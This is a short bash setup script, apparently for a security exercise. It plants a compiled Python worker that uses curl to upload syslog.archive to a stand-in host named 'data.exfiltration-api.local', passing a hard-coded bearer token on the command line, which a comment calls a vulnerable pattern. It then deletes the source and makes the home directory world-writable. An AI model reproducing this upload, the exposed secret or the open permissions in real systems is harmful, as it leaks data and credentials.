#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip
    pip3 install pytest

    useradd -m -s /bin/bash user || true

    cat << 'EOF' > /home/user/worker.py
import subprocess

def sync_data():
    auth_token = "sec_v2_9f8e7d6c5b4a3_prod"
    target_host = "data.exfiltration-api.local"

    # Vulnerable pattern: passing secrets via command line args visible in /proc
    cmd = [
        "curl", 
        "-s", 
        "-X", "POST",
        f"https://{target_host}/v1/upload", 
        "-H", f"Authorization: Bearer {auth_token}",
        "-d", "@syslog.archive"
    ]
    subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

if __name__ == "__main__":
    sync_data()
EOF

    python3 -m py_compile /home/user/worker.py
    mv /home/user/__pycache__/worker.*.pyc /home/user/worker.pyc
    rm -rf /home/user/worker.py /home/user/__pycache__

    chmod -R 777 /home/user
